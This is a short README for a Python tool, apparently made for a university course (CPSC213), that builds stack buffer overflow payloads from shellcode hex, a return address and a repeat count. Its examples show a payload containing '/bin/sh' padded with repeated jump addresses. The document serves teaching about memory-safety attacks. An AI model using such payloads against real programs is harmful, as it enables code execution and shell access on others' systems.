# Simple stack smashing tool
A simple stack smash tool that I designed for use in CPSC213

## Using command line arguments
#### beginstr:
The code that you want to run in hexadecimal
#### addr:
The address that you want to jump to (the location of beginstr in your system. most likely)
#### num:
The number of times you want to repeat addr (can go on indefinitely and say 1000, however this may overwrite data outside the stack, etc.)
### Example
    ~$ python3 stacksmashtool.py 6f40010000000007f1022f62696e2f736800 0000417c 29
    Your hex string:
    6f40010000000007f1022f62696e2f7368000000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c
    Your formatted string:
    o@?/bin/shA|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|%

## Using regular input
Exactly the same inputs as above, except you will be prompted for the input instead of specifying it beforehand
### Example
    ~$ python3 stacksmashtool.py
    Enter the code you want to run:
    6f40010000000007f1022f62696e2f736800
    What is the address you want to jump to?
    0000417c
    How many entries do you want to overwrite?
    29
    Your hex string:
    6f40010000000007f1022f62696e2f7368000000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c0000417c
    Your formatted string:
    o@?/bin/shA|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|A|%
    
